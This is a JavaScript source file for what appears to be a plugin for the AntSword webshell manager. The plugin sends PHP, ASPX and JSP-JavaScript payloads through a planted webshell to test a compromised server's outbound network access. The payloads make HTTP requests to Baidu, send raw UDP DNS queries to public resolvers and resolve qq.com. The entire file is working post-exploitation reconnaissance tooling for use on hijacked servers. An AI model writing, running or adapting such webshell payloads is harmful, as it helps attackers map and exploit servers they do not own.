'use strict';

const dns = require('dns');
const WIN = require('ui/window'); // 窗口库
const tabbar = require('ui/tabbar'); // Tab库
const LANG_T = antSword['language']['toastr']; // 通用通知提示

const LANG = require('./language/'); // 插件语言库
const Payload = require('./payload');
/**
 * 插件类
 */
class Plugin {
  constructor(opt) {
    let self = this;
    self.checkHTTPAddress = ['220.181.38.148', '36.152.44.95'];
    self.checkHTTPDomain = 'www.baidu.com';
    this.initCheckHTTPAddr();
    antSword['test'] = this;
    let win = new WIN({
      title: `${LANG['title']}-${opt['ip']}`,
      height: 280,
      width: 550,
    });
    self.win = win;
    let editor;
    editor = ace.edit(win.win.cell.lastChild);
    editor.$blockScrolling = Infinity;
    editor.setTheme('ace/theme/tomorrow');
    editor.session.setMode('ace/mode/text');
    editor.session.setUseWrapMode(true);
    editor.session.setWrapLimitRange(null, null);
    editor.setOptions({
      fontSize: '14px',
      enableBasicAutocompletion: true,
      enableSnippets: true,
      enableLiveAutocompletion: true
    });
    editor.setReadOnly(true);
    self.editor = editor;
    self.editor.session.setValue(LANG['tips']['init']);
    // 初始化 toolbar
    let toolbar = win.win.attachToolbar();
    toolbar.loadStruct([
      { id: 'start', type: 'button', text: LANG['toolbar']['start'], icon: 'play', }, // 开始按钮
      { id: 'reset', type: 'button', text: LANG['toolbar']['reset'], icon: 'undo', }, // 重置按钮
    ]);
    self.toolbar = toolbar;
    // 点击事件
    toolbar.attachEvent('onClick', (id) => {
      switch (id) {
        case 'start':
          self.editor.session.setValue(LANG['tips']['checking']);
          self.win.win.progressOn();
          let core = new antSword['core'][opt['type']](opt);
          // 向 Shell 发起请求
          core.request({
            _: self.getPayload(opt['type'])
          }).then((_ret) => { // 处理返回数据
            let res = _ret['text'];
            if (res.indexOf("ERROR://") > -1) {
              throw res;
            }
            self.editor.session.setValue(res);
            self.win.win.progressOff();
            toastr.success(LANG['success'], LANG_T['success']);
          }).catch((err) => { // 处理异常数据
            toastr.error(`${LANG['error']}: ${JSON.stringify(err)}`, LANG_T['error']);
            self.win.win.progressOff();
          });
          break;
        case 'reset':
          self.editor.session.setValue(LANG['tips']['init']);
          break;
        default:
          break;
      }
    });
  }

  initCheckHTTPAddr() {
    let self = this;
    dns.resolve4(self.checkHTTPDomain, (err, address) => {
      if (!err && address.length > 0) {
        self.checkHTTPAddress = address;
        console.log(self.checkHTTPAddress);
      }
    });
  }

  // 自定义函数,用于获取不同类型的 payload
  getPayload(shelltype) {
    let self = this;
    let codes = {
      php: `
      function checkDNS($domain){
        echo("[*][DNS] Try to resolve \${domain} with system nameserver\\n");
        $dnsres = dns_get_record($domain,DNS_A);
        if(sizeof($dnsres)>0){
          echo("[+][DNS][Success][\${domain}]\\n");
          foreach ($dnsres as $v) {
            printf("\\t%s: %s\\n",$v['host'],$v['ip']);
          }
        } else {
          echo("[-][DNS][Fail][\${domain}]\\n");
        }
      }
      function checkHTTP(){
        $ips = ['${self.checkHTTPAddress.join("','")}', '${self.checkHTTPDomain}'];
        echo("[*][HTTP] Try to send HTTP request\\n");
        foreach($ips as $ip) {
          $httpres = file_get_contents("http://\${ip}");
          if($httpres===false){
            echo("[-][HTTP][Fail][http://\${ip}]\\n");
            continue;
          };
          echo("[+][HTTP][Success][http://\${ip}]\\n");
          break;
        }
      }
      function udpGet($sendMsg='9b540100000100000000000002717103636f6d0000010001',$ip='114.114.114.114',$port='53'){
        $handle=stream_socket_client("udp://{$ip}:{$port}", $errno, $errstr);
        if(!$handle){
          echo("[-][UDP][ERROR] {$errno} - {$errstr}\\n");
          return;
        }
        $sendMsg=hex2bin($sendMsg);
        @fwrite($handle, $sendMsg);
        $result = fread($handle,1024);
        @fclose($handle);
        return $result;
      }
      checkHTTP();
      echo("[*][UDP] Try to send UDP request\\n");
      if(stristr(urlencode(udpGet('9b540100000100000000000002717103636f6d0000010001','8.8.8.8','53')), 'qq%03com')) {
        echo "[+][UDP][Success][8.8.8.8:53]\\n";
      }else{
        echo "[-][UDP][Fail][8.8.8.8:53]\\n";
      }
      checkDNS("qq.com");
      `,
      asp: '',
      aspx: `
      function UdpGet(ip:String):String{
        try{
          var client = new System.Net.Sockets.UdpClient();
          client.Connect(ip, 53);
          var sendBody = "9b540100000100000000000002717103636f6d0000010001";
          var sendBytes:byte[]=new byte[sendBody.Length/2];
          for(var i=0;i<sendBody.Length;i+=2){
              sendBytes[i/2] = byte(System.Convert.ToInt32(String(sendBody.Substring(i,2)),16));
          };
          client.Send(sendBytes, sendBytes.Length);
          var recvBytes = client.Receive();
          var returnData = Encoding.ASCII.GetString(recvBytes);
          client.Close();
          if(returnData.Contains("qq\\x03com")){
              return String.Format("[+][UDP][Success][{0}:53]\\n", ip);
          }else{
              return String.Format("[-][UDP][Fail][{0}:53]\\n", ip);
          };
        }catch(e){
          return String.Format("[-][UDP][ERROR][{0}:53][{1}]\\n", ip, e);
        }
      };
      function CheckHTTP():String{
        var ips = "${self.checkHTTPAddress.join("|")}|${self.checkHTTPDomain}".Split("|");
        var i;
        var ret=new System.Text.StringBuilder();
        for(i in ips){
          try{
              var req = System.Net.HttpWebRequest(System.Net.WebRequest.Create("http://"+ips[i]));
              req.Timeout=3000;
              var resp = System.Net.HttpWebResponse(req.GetResponse());
              resp.Close();
              if (resp.StatusCode>0) {
                ret.AppendFormat("[+][HTTP][Success][http://{0}]\\n", ips[i]);
              }else{
                ret.AppendFormat("[-][HTTP][Fail][http://{0}]\\n", ips[i]);
              };
          }catch(e){
            ret.AppendFormat("[-][HTTP][Fail][http://{0}][{1}]\\n", ips[i], e);
          };
        };
        return ret.ToString();
      };
      function CheckDNS(domain:String):String {
        var ret=new System.Text.StringBuilder();
        ret.AppendFormat("[*][DNS] Try to resolve {0} with system nameserver\\n", domain);
        try{
          var host = System.Net.Dns.GetHostEntry(domain);
          if (host.AddressList.Length > 0){
            ret.AppendFormat("[+][DNS][Success][{0}]\\n\\t{1}\\n",domain, host.AddressList.ToString());
          }
        }catch(e){
          ret.AppendFormat("[-][DNS][ERROR][{0}][{1}]\\n", domain, e);
        }
        return ret.ToString();
      };
      var sb=new System.Text.StringBuilder();
      sb.Append(UdpGet("114.114.114.114"));
      sb.Append(UdpGet("223.5.5.5"));
      sb.Append(CheckHTTP());
      sb.Append(CheckDNS("qq.com"));
      Response.Write(sb.ToString());`.replace(/\n\s+/g, ''),
      jspjs: `
      function bytesToHex(bytes) {
        var h = "0123456789ABCDEF";
        var sb = new StringBuilder(bytes.length * 2);
        for (var i = 0; i < bytes.length; i++) {
          sb.append(h.charAt((bytes[i] & 0xf0) >> 4));
          sb.append(h.charAt((bytes[i] & 0x0f) >> 0));
        }
        return sb.toString();
      };
      function udpGet(b64msg,ip,port){
        importPackage(Packages.java.net);
        var socket = null;
        socket = new DatagramSocket(0);
        socket.setSoTimeout(30);
        var host = InetAddress.getByName(ip);
        var tempBytes = Base64DecodeToByte(b64msg);
        var udpreq = new DatagramPacket(tempBytes, tempBytes.length, host, port);
        var byteArray = Java.type("byte[]");
        var udpresp = new DatagramPacket(new byteArray(1024), 1024);
        socket.send(udpreq);
        socket.receive(udpresp);
        return bytesToHex(udpresp.getData());
      };
      function checkDNS(domain){
        output.append("[*][DNS] Try to resolve "+ domain +" with system nameserver\\n");
        try{
          var hosts = InetAddress.getAllByName(domain);
          if(hosts.length>0){
            output.append("[+][DNS][Success]["+domain+"]\\n");
            for(var i=0;i<hosts.length; i++){
              output.append("\\t"+hosts[i]+"\\n");
            }
          }
        }catch(ex){
          output.append("[-][DNS][ERROR]["+domain+"]["+ex.getMessage()+"]\\n");
        }
      };
      function checkHTTP() {
        output.append("[*][HTTP] Try to send HTTP request\\n");
        var ips = ['${self.checkHTTPAddress.join("','")}', '${self.checkHTTPDomain}'];
        for(var i=0; i<ips.length; i++){
          var urlPath = "http://"+ips[i];
          var url = new java.net.URL(urlPath);
          try{
            var connection = url.openConnection();
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);
            connection.connect();
            if(connection.getResponseCode()>0) {
              output.append("[+][HTTP][Success]["+ urlPath +"]\\n");
            }
            connection.disconnect();
            break;
          }catch(ex){
            output.append("[-][HTTP][Error]["+ urlPath +"]\\n");
          }
        }
      };
      checkHTTP();
      output.append("[*][UDP] Try to send UDP request\\n");
      var udppacket="m1QBAAABAAAAAAAAAnFxA2NvbQAAAQAB";
      var nameservers = ["114.114.114.114", "223.5.5.5", "8.8.8.8", "9.9.9.9"];
      for(var i=0;i<nameservers.length;i++){
        var udpret = "";
        try{
          udpret = udpGet(udppacket, nameservers[i], 53);
          if(udpret.indexOf("717103636F6D")>-1){
            output.append("[+][UDP][Success]["+nameservers[i]+":53]\\n");
            break;
          } else {
            output.append("[-][UDP][Fail]["+nameservers[i]+":53]\\n");
          }
        }catch(ex){
          output.append("[-][UDP][ERROR]["+nameservers[i]+":53]["+ex.getMessage()+"]\\n");
        }
      };
      checkDNS("qq.com");`,
      jsp: Payload.jsp,
    }
    if (["php4", "phpraw"].indexOf(shelltype) > -1) {
      return codes['php'];
    }
    return codes[shelltype];
  }
}

module.exports = Plugin;